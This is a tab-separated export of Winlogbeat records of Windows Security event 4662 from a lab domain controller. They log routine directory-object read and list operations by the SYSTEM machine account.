"May 28, 2026 @ 20:58:11.065"	"2hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109719	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"2RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{64759b35-d3a1-42e4-b5f1-a3de162109b3}
	Object Name:		%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}"	DS	"%{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109718	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"2BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf967950-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{eeed0fc8-1001-45ed-80cc-bbf744930720}
			{4699f15f-a71f-48e2-9ff5-5897c0759205}
			{d6d67084-c720-417d-8647-b696237a114c}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf967950-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{eeed0fc8-1001-45ed-80cc-bbf744930720}
			{4699f15f-a71f-48e2-9ff5-5897c0759205}
			{d6d67084-c720-417d-8647-b696237a114c}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109713	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"1xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		READ_CONTROL
				
	Access Mask:		0x20000
	Properties:		READ_CONTROL
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%1538
				"	0x20000	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%1538
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109712	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"1hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109711	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"1RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109710	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"1BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109705	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"0xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109704	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"0hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109703	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"0RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109698	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"0BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109697	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.064"	"zxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109696	"Directory Service Access"	" - "	" - "	" - "	" - "	-
